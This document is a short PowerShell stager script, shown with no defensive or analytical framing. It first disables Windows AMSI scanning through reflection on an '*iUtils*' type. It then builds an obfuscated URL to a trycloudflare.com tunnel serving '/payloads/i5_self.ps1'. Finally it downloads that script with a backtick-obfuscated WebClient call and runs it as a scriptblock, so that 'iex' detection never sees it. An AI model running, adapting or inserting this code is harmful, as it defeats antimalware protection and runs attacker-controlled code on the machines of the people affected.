# AMSI bypass + obfuscated download
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils*"){$_}}
$f=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context*"}
if($f){$f.SetValue($null,[IntPtr]::Zero)}

# Obfuscated URL construction
$h="https://geometry-offered-guns-replies"
$d=".trycloudflare.com"
$p="/payloads/i5_self.ps1"
$k="?key=8ca60eebbe9a141869305ed9ab1a0050"

# Use .NET WebClient with obfuscated method
$wc=New-Object "Net`.Web`Client"
[Net.ServicePointManager]::SecurityProtocol=[Enum]::Parse([Net.SecurityProtocolType],"Tls12")
$code=$wc."Down`load`String"($h+$d+$p+$k)

# Execute without iex
$sb=[scriptblock]::Create($code)
&$sb
